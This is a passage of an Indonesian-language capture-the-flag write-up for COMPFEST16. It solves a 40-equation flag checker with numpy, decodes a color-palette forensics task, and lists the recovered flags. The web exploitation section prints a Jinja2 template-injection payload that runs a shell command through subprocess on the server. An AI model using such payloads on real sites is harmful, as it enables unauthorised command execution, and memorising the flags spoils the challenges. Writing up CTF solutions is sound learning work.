...
**Author:** Zanark
Attachments: FlagChecker.java

> [!NOTE]- FlagChecker.java
...
Setelah attachment dibuka, terdapat 40 persamaan dengan 40 variabel yang disimpan dalam array la[]. Setelah dilakukan beautify code, dari program tersebut dapat disimpulkan bahwa flag yang benar harus dicari dengan menemukan solusi dari keempat puluh variabel dari 40 persamaan yang ditulis sebagai kondisi di percabangan if tersebut yang selanjutnya dikonversi menjadi karakter dalam ASCII. Oleh karena itu, dilakukan parsing menggunakan library regex dalam python untuk mendapatkan solusi dari persamaan-persamaan tersebut. 

Untuk menyelesaikan persamaan tersebut, perlu diekstrak terlebih dahulu koefisien-koefisien dari masing-masing persamaan dan ruas kanan dari persamaan tersebut.

Berikut adalah script python yang digunakan untuk mengekstrak koefisien sekaligus RHS:


> [!NOTE]- Script Python untuk Mengekstrak Koefisien dan RHS
> liat parsing regex.py dan parsingterus.py


Kemudian setelah diperoleh koefisien dan ruas kanan dari persamaan tersebut, dimasukkan nilainya ke dalam script python yang mampu menyelesaikan persamaan linear matematis menggunakan library numpy:


> [!NOTE]- Script Python untuk Menyelesaikan 40 Persamaan Linear
> numpy, flagchecker.py
>



Sehingga diperoleh solusi dari keempat puluh persamaan tersebut secara berturut-turut yakni:

```
Solution to the system of equations:
[ 49. 116. 115.  95. 106.  85. 115. 116.  95. 108.  49. 110.  51.  97.
 114.  95.  51. 113. 117.  52. 116. 105.  48.  78. 115.  95.  98. 114.
  48.  95.  99.  52.  97.  56.  56. 100.  54. 102. 100.  56.]
```

Terakhir dikonversi nilai dari solusi yang diperoleh ke dalam ASCII menggunakan program berikut:
...
array = np.array([49.0, 116.0, 115.0, 95.0, 106.0, 85.0, 115.0, 116.0, 95.0, 108.0,

                  49.0, 110.0, 51.0, 97.0, 114.0, 95.0, 51.0, 113.0, 117.0, 52.0,

                  116.0, 105.0, 48.0, 78.0, 115.0, 95.0, 98.0, 114.0, 48.0, 95.0,

                  99.0, 52.0, 97.0, 56.0, 56.0, 100.0, 54.0, 102.0, 100.0, 56.0])

  

# Convert float array to integer array

ascii_codes = array.astype(int)

  

# Convert ASCII codes to characters

ascii_characters = ''.join(chr(code) for code in ascii_codes)

  

print("ASCII String:", ascii_characters)
```

Sehingga diperoleh string berikut:

`ASCII String: 1ts_jUst_l1n3ar_3qu4ti0Ns_br0_c4a88d6fd8`

Jadi, flag yang dimaksud haruslah COMPFEST16{1ts_jUst_l1n3ar_3qu4ti0Ns_br0_c4a88d6fd8}.

B. Forensics
1. Color Palette 
Concat semua 5 hex warna paling dominan terus convert ke from Hex to Base64 di Cyberchef, sempet pake script cuma keknya programnya salah, pick hex dominan manual di https://imagecolorpicker.com/, dapet hex nya b6bbb7734974aec8a7b35777cb4bae, terus pas di Cyberchef jadi tru3c0l0rsins1d3y0uu. FLAG : COMPFEST16{tru3c0l0rsins1d3y0uu}. (Dukunn)

C. Web Exploitation
1. Greet Friend
	Berikut adalah payload yang tepat: 
	 Flag akan keluar ketika payload dimasukkan ke /name={{` {{ url_for._globals.builtins.import_('subprocess').Popen('cat main.py', shell=True,stdout=-1).communicate()}} `}}

D. Cryptography
1. AES encryption
https://colab.research.google.com/drive/1EwHoClNoRZHB8s_tcu4ubsNGP0fpBnGy#scrollTo=l2U0qJrdNrcK
